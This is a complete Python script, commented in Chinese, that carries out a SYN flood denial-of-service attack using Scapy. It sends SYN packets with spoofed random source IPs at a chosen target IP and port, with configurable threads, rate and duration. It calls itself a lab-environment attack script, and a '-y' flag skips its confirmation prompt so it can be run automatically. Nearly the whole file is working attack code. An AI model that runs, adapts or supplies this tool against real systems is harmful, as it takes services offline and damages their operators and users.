#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
 python stack.py 192.168.55.123 80 -t 500 --duration 1000 --rate 2000
"""
import argparse
import random
import time
import threading
import sys
import io
from scapy.all import *
from concurrent.futures import ThreadPoolExecutor, as_completed

# 确保stdout使用UTF-8编码
if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

# 检查Scapy是否可用
try:
    from scapy.all import IP, TCP, send
except ImportError:
    print("需要安装Scapy库: pip install scapy")
    sys.exit(1)

# 检查是否在Windows上运行
if sys.platform == "win32":
    try:
        from scapy.arch.windows import get_windows_if_list

        print("检测到Windows系统，请确保已安装Npcap")
    except ImportError:
        print("Windows系统需要安装Npcap: https://npcap.com/")
        sys.exit(1)


class ScapyWorker:
    def __init__(self, target_ip, target_port, stats, rate_lock):
        self.target_ip = target_ip
        self.target_port = target_port
        self.stats = stats
        self.rate_lock = rate_lock

    def send_syn(self, thread_id):
        """使用Scapy发送SYN包"""
        # 生成随机源IP和端口
        src_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        src_port = random.randint(1024, 65535)

        try:
            # 创建IP和TCP层
            ip_layer = IP(src=src_ip, dst=self.target_ip)
            tcp_layer = TCP(sport=src_port, dport=self.target_port, flags="S", seq=random.randint(0, 4294967295))

            # 发送数据包
            send(ip_layer / tcp_layer, verbose=0)

            with self.stats['lock']:
                self.stats['sent'] += 1

            return True
        except Exception as e:
            with self.stats['lock']:
                self.stats['errors'] += 1
            return False


def reporter(stats, interval, stop_event):
    """报告统计信息"""
    while not stop_event.is_set():
        time.sleep(interval)
        with stats['lock']:
            print(f"[REPORT] sent={stats['sent']} errors={stats['errors']}", flush=True)
    # 最终报告
    with stats['lock']:
        print("[FINAL] ", stats, flush=True)


def main():
    parser = argparse.ArgumentParser(description="Scapy SYN洪水攻击脚本（实验环境）")
    parser.add_argument("target_ip", help="目标IP")
    parser.add_argument("target_port", type=int, help="目标端口")
    parser.add_argument("-t", "--threads", type=int, default=50, help="并发线程数")
    parser.add_argument("--duration", type=int, default=60, help="脚本总运行时长（秒）")
    parser.add_argument("--rate", type=int, default=1000, help="每秒发送SYN包数")
    parser.add_argument("--interface", default=None, help="指定网络接口（可选）")
    parser.add_argument("-y", "--yes", action="store_true", help="自动确认，跳过交互式确认（用于API调用）")
    args = parser.parse_args()
    
    # 显示警告信息
    print(f"将对 {args.target_ip}:{args.target_port} 进行SYN洪水攻击", flush=True)
    print(f"参数: 线程数={args.threads}, 持续时间={args.duration}秒, 速率={args.rate}包/秒", flush=True)
    
    # 确认操作（除非使用-y参数）
    if not args.yes:
        response = input("确认继续? (y/N): ")
        if response.lower() != 'y':
            print("操作已取消", flush=True)
            sys.exit(0)
    
    stats = {'sent': 0, 'errors': 0, 'lock': threading.Lock()}
    stop_event = threading.Event()
    rate_lock = threading.Condition()

    # 报告线程
    rep = threading.Thread(target=reporter, args=(stats, 5, stop_event), daemon=True)
    rep.start()

    # 如果指定了网络接口
    if args.interface:
        conf.iface = args.interface
        print(f"使用网络接口: {args.interface}", flush=True)

    worker = ScapyWorker(args.target_ip, args.target_port, stats, rate_lock)

    end_time = time.time() + args.duration
    total_tasks = 0

    try:
        with ThreadPoolExecutor(max_workers=args.threads) as exe:
            futures = []
            while time.time() < end_time:
                # 速率限制
                if args.rate > 0:
                    # 简单速率控制: 每秒允许args.rate个包
                    start_sec = time.time()
                    allowed = args.rate
                    while allowed > 0 and time.time() < end_time:
                        futures.append(exe.submit(worker.send_syn, total_tasks % args.threads))
                        total_tasks += 1
                        allowed -= 1
                    # 睡眠以对齐下一秒
                    elapsed = time.time() - start_sec
                    if elapsed < 1:
                        time.sleep(1 - elapsed)
                else:
                    # 无速率限制，尽可能多地发送
                    for _ in range(args.threads):
                        if time.time() >= end_time:
                            break
                        futures.append(exe.submit(worker.send_syn, total_tasks % args.threads))
                        total_tasks += 1
                    # 小暂停以避免完全淹没
                    time.sleep(0.1)

            # 等待所有任务完成
            for f in as_completed(futures):
                pass

    except KeyboardInterrupt:
        print("用户中断，正在停止...", flush=True)
    finally:
        stop_event.set()
        time.sleep(0.5)
        with stats['lock']:
            print("结束统计：", stats, flush=True)


if __name__ == "__main__":
    main()